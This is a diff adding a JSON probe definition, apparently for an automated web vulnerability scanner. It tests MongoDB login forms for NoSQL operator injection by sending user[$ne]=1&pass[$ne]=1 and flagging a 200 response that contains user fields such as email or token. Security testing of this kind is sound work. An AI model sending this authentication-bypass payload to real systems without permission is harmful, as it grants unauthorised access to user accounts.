@@ -1,0 +1,32 @@
+{
+  "name": "web/NoSQL Mongo operator login bypass",
+  "description": "[high] Proves NoSQL operator injection auth bypass (PayloadsAllTheThings NoSQL chapter): bracket params user[$ne]=1&pass[$ne]=1 reach MongoDB as {$ne:1} -> login succeeds with 200 + a user-object field, Express/qs-extended apps only. Keywords: nosql mongodb $ne operator injection express qs auth bypass. ctrl: benign request (operator filtered or strict parse) stays 401 -> not falsified. probe_url = app root; skill rides /login with bracket params.",
+  "cwe": "CWE-943",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{probe_url}}/login?user%5B%24ne%5D=1&pass%5B%24ne%5D=1"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "\\\"(email|username|token|role|first_name)\\\":",
+      "present": true
+    }
+  ],
+  "params": [
+    "probe_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "55808206acfc",
+  "created": "2026-11-05T19:30:06.502181+00:00",
+  "last_used": "2026-11-05T19:30:06.502181+00:00"
+}
